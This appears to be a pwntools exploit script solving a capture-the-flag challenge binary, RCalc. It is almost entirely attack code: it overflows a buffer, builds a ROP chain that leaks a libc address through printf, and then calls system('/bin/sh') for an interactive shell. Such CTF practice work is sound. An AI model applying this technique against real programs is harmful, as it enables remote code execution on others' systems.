from pwn import *
# from LibcSearcher import LibcSearcher

context.log_level = 'DEBUG'
elf = context.binary = ELF('../file/RCalc')

p = process('../file/RCalc_patch')
libc = ELF('/mnt/d/security/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')

# p = remote('61.147.171.105', '58837')
# libc = ELF('/mnt/d/security/libc6_2.23-0ubuntu10_amd64.so')

pause()

def heap_overflow():
    for i in range(int(0x110/8) + 1):
        p.sendlineafter(b'Your choice:', b'1')
        p.sendlineafter(b'integer: ', b'0')
        p.sendline(b'0')
        p.sendlineafter(b'Save the result? ', b'yes')

pop_rdi_ret = 0x0000000000401123
mov_eax_0_pop_rbp = 0x00000000004010b2
main_addr = 0x401036

# 避免whitespace字符，如0x20、0x09、0x0a，且进入printf时al需要为0
# glibc 2.35的printf调用需要满足的条件更多，不知道怎么满足，因此本地跑这个会失败
payload = p64(0) * int(0x108 / 8) + flat(
    0,
    b'a' * 8,
    pop_rdi_ret,
    elf.got['__libc_start_main'],
    elf.plt['printf'],
    main_addr
)
p.sendlineafter(b'pls: ', payload)
heap_overflow()
p.sendlineafter(b'Your choice:', b'5')

# 本地
libc.address = u64(p.recv(6).ljust(8, b'\0')) - libc.sym['__libc_start_main']
binsh_addr = next(libc.search(b'/bin/sh'))
system_addr = libc.sym['system']

# 远程
# libc = LibcSearcher('__libc_start_main', libc.address)
# binsh_addr = libc.dump('str_bin_sh')
# system_addr = libc.dump('system')

payload = p64(0) * int(0x108 / 8) + flat(
    0,
    b'a' * 8,
    pop_rdi_ret,
    binsh_addr,
    system_addr
)
p.sendlineafter(b'pls: ', payload)
heap_overflow()
p.sendlineafter(b'Your choice:', b'5')

p.interactive()